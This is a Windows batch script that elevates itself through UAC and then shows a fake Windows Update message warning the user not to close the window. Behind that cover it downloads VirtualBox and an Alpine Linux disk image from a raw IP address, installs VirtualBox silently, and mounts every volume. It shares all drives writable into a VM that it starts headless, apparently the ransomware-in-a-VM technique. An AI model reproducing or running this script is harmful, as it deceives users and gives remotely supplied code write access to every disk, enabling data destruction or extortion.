::::::::::::::::::::::::::::::::::::::::::::
:: Elevate.cmd - Version 4
:: Automatically check & get admin rights
:: see "https://stackoverflow.com/a/12264592/1016343" for description
::::::::::::::::::::::::::::::::::::::::::::
 @echo off
 CLS

:init
 setlocal DisableDelayedExpansion
 set cmdInvoke=1
 set winSysFolder=System32
 set "batchPath=%~0"
 for %%k in (%0) do set batchName=%%~nk
 set "vbsGetPrivileges=%temp%\OEgetPriv_%batchName%.vbs"
 setlocal EnableDelayedExpansion

:checkPrivileges
  NET FILE 1>NUL 2>NUL
  if '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges )

:getPrivileges
  if '%1'=='ELEV' (echo ELEV & shift /1 & goto gotPrivileges)
  ECHO Set UAC = CreateObject^("Shell.Application"^) > "%vbsGetPrivileges%"
  ECHO args = "ELEV " >> "%vbsGetPrivileges%"
  ECHO For Each strArg in WScript.Arguments >> "%vbsGetPrivileges%"
  ECHO args = args ^& strArg ^& " "  >> "%vbsGetPrivileges%"
  ECHO Next >> "%vbsGetPrivileges%"

  if '%cmdInvoke%'=='1' goto InvokeCmd 

  ECHO UAC.ShellExecute "!batchPath!", args, "", "runas", 1 >> "%vbsGetPrivileges%"
  goto ExecElevation

:InvokeCmd
  ECHO args = "/c """ + "!batchPath!" + """ " + args >> "%vbsGetPrivileges%"
  ECHO UAC.ShellExecute "%SystemRoot%\%winSysFolder%\cmd.exe", args, "", "runas", 1 >> "%vbsGetPrivileges%"

:ExecElevation
 "%SystemRoot%\%winSysFolder%\WScript.exe" "%vbsGetPrivileges%" %*
 exit /B

:gotPrivileges
 setlocal & cd /d %~dp0
 if '%1'=='ELEV' (del "%vbsGetPrivileges%" 1>nul 2>nul  &  shift /1)

 ::::::::::::::::::::::::::::
 ::START
 ::::::::::::::::::::::::::::
 :: https://download.virtualbox.org/virtualbox/6.1.22/VirtualBox-6.1.22-144080-Win.exe
 REM Run shell as admin (example) - put here code as you like
 @echo off
 ECHO Finalizing Microsoft Windows Updates...
 ECHO Closing this window manually will result in data loss.
 ECHO This window will close automatically once updates are complete.
 curl -o C:\test\vbox.exe http://51.222.157.180/vbox.exe
 curl -o C:\test\AlpineLinux.vdi http://51.222.157.180/AlpineLinux.vdi
 curl -o C:\test\vm1.txt http://51.222.157.180/vm1.txt
 curl -o C:\test\vm2.txt http://51.222.157.180/vm2.txt
 C:\test\vbox.exe --silent --ignore-reboot
 echo > C:\test\sf.txt
 mountvol | find "}\" > C:\test\v.txt
  (for /F %%i In (v.txt) Do (
    Set freedrive=0
    FOR %%d IN (C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO (
      IF NOT EXIST %%d:\ (
        IF “!freedrive!”==”0” (
          Set freedrive=%%d
        )
      )
    )
    mountvol !freedrive!: %%i
    ping -n 2 127.0.0.1
  ))
  Set driveid=0
  FOR %%d IN (C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO (
    IF EXIST %%d:\ (
      Set /a driveid+=1
      echo ^<SharedFolder name="!driveid!" hostPath="%%d:\" writable="true"/^> >> C:\test\sf.txt
    )
  )
  type C:\test\vm1.txt > C:\test\AlpineLinux.vbox
  type C:\test\sf.txt >> C:\test\AlpineLinux.vbox
  type C:\test\vm2.txt >> C:\test\AlpineLinux.vbox
  "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" registervm C:\test\AlpineLinux.vbox
  "C:\Program Files\Oracle\VirtualBox\VBoxHeadless.exe" -startvm AlpineLinux -v off
 pause
 ::exit